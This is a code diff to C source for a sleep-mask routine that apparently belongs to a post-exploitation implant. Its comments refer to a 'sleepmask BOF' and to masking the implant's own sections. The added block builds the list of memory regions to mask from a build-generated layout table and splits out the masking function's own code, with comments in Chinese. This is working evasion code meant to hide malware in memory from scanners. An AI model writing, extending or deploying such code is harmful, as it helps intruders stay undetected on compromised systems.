@@ -19,6 +19,10 @@ GARGLEP * gparms = NULL;
  * .pdata/.fptable/.reloc. [xbegin,xend) is an optional absolute-address
  * exclusion for the mask function itself (the trampoline path executes
  * from our own .text and must never mask the code it is running). */
+#ifdef BW_LLVM_LAYOUT
+#include "gen/layout.h"
+#endif
+
 DWORD gargle_own_sections(GARGLEP * gp, void * xbegin, void * xend) {
 	/* The table MUST live OUTSIDE every masked range: the official sleepmask
 	 * BOF re-reads parms->sections on the unmask pass (mask_sections is
@@ -73,6 +77,55 @@ DWORD gargle_own_sections(GARGLEP * gp, void * xbegin, void * xend) {
 			return 0;
 	}
 
+#ifdef BW_LLVM_LAYOUT
+	/* 定向重写：掩码区域 = 构建期自描述表（gen/layout.h，由构建管线从
+	 * 最终镜像派生），不再运行时解析 PE / 按节名猜边界——任何编译器的
+	 * 布局差异由管线自动消化。排除跨度（掩码函数自身代码所在 .text
+	 * 区间）仍需运行时计算，拆分逻辑保持不变。 */
+	{
+		unsigned int li;
+		own[0] = 0;
+		own[1] = 0x1000;
+		for (li = 0; li < bw_layout_reg_n && count < 34; li++) {
+			unsigned int va = (unsigned int)bw_layout_reg[li][0];
+			unsigned int ve = (unsigned int)bw_layout_reg[li][1];
+			if (ve <= va)
+				continue;
+			if (have_excl && xe > va && xb < ve) {
+				if (xb > va && count < 34) {
+					own[count * 2] = va;
+					own[count * 2 + 1] = xb;
+					if (xb > span)
+						span = xb;
+					count++;
+				}
+				if (xe < ve && count < 34) {
+					own[count * 2] = xe;
+					own[count * 2 + 1] = ve;
+					if (ve > span)
+						span = ve;
+					count++;
+				}
+				continue;
+			}
+			own[count * 2] = va;
+			own[count * 2 + 1] = ve;
+			if (ve > span)
+				span = ve;
+			count++;
+		}
+		if (count <= 1) {
+			own[0] = 0;
+			own[1] = 0;
+			gp->sections = own;
+			return 0;
+		}
+		own[count * 2] = 0;
+		own[count * 2 + 1] = 0;
+		gp->sections = own;
+		return span;
+	}
+#endif
 	own[0] = 0;
 	own[1] = 0x1000;
 	for (i = 0; i < nsec && count < 34; i++) {
